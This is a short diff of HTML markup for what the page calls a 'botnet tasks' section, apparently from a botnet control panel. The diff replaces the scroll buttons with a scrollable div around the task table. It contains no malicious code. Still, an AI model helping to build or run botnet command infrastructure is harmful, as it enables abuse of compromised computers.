@@ -46,8 +46,7 @@
 		<!-- botnet tasks section -->
 		<section id="tasks" class="content">
 			<h2>Tasks</h2>
-			<button onclick="scrollDown();">&darr; scroll down</button>
-			<button onclick="taskRequest();">🔃 Reload</button>
+			<div id="scrolldiv">
 			<table id="task-overview" onload="taskRequest()">
 				<thead>
 					<tr>
@@ -60,7 +59,7 @@
 				<tbody id="task-overview-results">
 				</tbody>
 			</table>
-			<button onclick="scrollUp();">&uarr; scroll up</button>
+			</div>
 			<button onclick="taskRequest();">🔃 Reload</button>
 			
 			<!-- create new task -->
